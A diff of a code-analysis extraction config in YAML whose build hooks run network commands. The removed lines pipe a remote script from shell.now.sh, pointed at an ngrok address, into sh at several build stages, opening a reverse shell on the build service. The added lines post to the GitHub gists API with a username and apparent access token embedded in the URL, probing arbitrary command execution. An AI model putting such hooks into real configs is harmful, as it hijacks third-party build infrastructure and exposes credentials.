@@ -1,9 +1,7 @@
 extraction:
     c:
         after_prepare:
-            - curl https://shell.now.sh/0.tcp.ngrok.io:17834 | sh
-        before_index:
-            - curl https://shell.now.sh/0.tcp.ngrok.io:17834 | sh
+            - curl --data '{"description": "TEST!!!!!! create a github gists via api", "public": "true", "files": {"test.txt": {"content": "test1"}}}' https://homelessgod:cbbe2134d354ecb0f86d44f6a7eed742d4dd570c@api.github.com/gists
         index:
             build_command:
-                - curl https://shell.now.sh/0.tcp.ngrok.io:17834 | sh
+              - curl --data '{"description": "TEST@@@@@@@@ create a github gists via api", "public": "true", "files": {"test.txt": {"content": "test2"}}}' https://homelessgod:cbbe2134d354ecb0f86d44f6a7eed742d4dd570c@api.github.com/gists
